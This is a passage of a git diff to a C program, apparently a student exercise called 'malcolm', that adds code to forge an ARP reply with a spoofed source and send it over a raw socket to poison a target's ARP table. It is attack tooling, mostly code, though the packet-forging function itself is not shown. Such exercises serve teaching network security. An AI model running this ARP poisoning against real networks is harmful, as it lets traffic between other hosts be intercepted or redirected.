     ft_printf("Receve an ARP request from %u.%u.%u.%u to %u.%u.%u.%u\n", ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_target_ip_addr_[3], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[0], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[1], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[2], ptr_cstc_pssd_malcolm_data->u8_source_ip_addr_[3]);
+
+    /**
+    * Forge an ARP respond packet
+    */
+    u8_lcl_return_from_function = RETURN_FAILURE;
+    u8_lcl_return_from_function = Fu8__forge_arp_respond(ptr_estc_lcl_ether_arp, ptr_estc_lcl_ether_header, ptr_cstc_pssd_malcolm_data);
+
+    /**
+    * Check if function to Forge an ARP respond packet succeeded
+    */
+    if(u8_lcl_return_from_function != RETURN_SUCCESS)
+        {
+        /**
+        * Treat the case when the function to Forge an ARP respond packet failed
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to Forge an ARP respond packet  failed\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the function to Forge an ARP respond packet failed
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when function to Forge an ARP respond packet succeeded
+        */
+        } 
+
+    ft_printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
+
+    /**
+    * Sending the forged arp reply
+    */
+    sszt_lcl_number_of_byte = RETURN_FAILURE;
+    sszt_lcl_number_of_byte = sendto(ptr_cstc_pssd_malcolm_data->s32_socket_, u8_lcl_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *) &estc_lcl_socket_addr, sizeof(struct sockaddr_ll));
+
+    /**
+    * Check if function to send the forged arp reply succeeded
+    */
+    if(sszt_lcl_number_of_byte < 0)
+        {
+        /**
+        * Treat the case when the function to send the forged arp reply failed
+        */
+
+        #ifdef DEVELOPEMENT
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m in function \033[1m%s\033[0m at line \033[1m%d\033[0m\n    The function to send the forged arp reply  failed\n", __FILE__, __func__, __LINE__);
+        #endif
+
+        #ifdef DEMO
+        fprintf(stderr, "\033[1;31mERROR\033[0m: in file \033[1m%s\033[0m at line \033[1m%s\033[0m\n", __FILE__, __LINE__);
+        #endif
+
+        #ifdef PRODUCTION
+        fprintf(stderr, "\033[1;31mERROR\033[0m\n");
+        #endif
+
+        /**
+        * Return failure to indicate the function to send the forged arp reply failed
+        */
+        return (RETURN_FAILURE);
+        }
+    else
+        {
+        /**
+        * Treat the case when function to send the forged arp reply succeeded
+        */
+        }
+
+    ft_printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
 
     return (RETURN_SUCCESS);
     }
@@ -2675,8 +3314,6 @@ int main(int32_t s32_pssd_program_argument_number, char **dbl_ptr_s8_pssd_progra
         */
         }
 
-    (void) Fv__display_structure_malcolm_data(&cstc_lcl_malcolm_data);
-
     /**
     * Making the arp poisoning
     */
@@ -2754,6 +3391,8 @@ int main(int32_t s32_pssd_program_argument_number, char **dbl_ptr_s8_pssd_progra
         * Treat the case when function to make the arp poisoning succeeded
         */
         }
+
+    (void) Fv__display_structure_malcolm_data(&cstc_lcl_malcolm_data);
 
     /**
     * Closing the structure malcolm data
